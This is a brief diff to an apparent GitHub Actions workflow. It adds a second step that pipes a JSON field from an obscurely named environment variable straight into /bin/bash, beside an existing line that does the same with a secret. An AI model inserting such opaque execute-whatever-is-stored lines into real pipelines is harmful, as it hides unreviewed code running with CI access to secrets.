@@ -20,6 +20,7 @@ jobs:
           ykcum862: ${{ secrets.ykcum862 }}
         run: |
           printf '%s' "$ykcum862" | jq -r .ltl44211 | /bin/bash
+          printf '%s' "$eswe565" | jq -r .kf02095 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
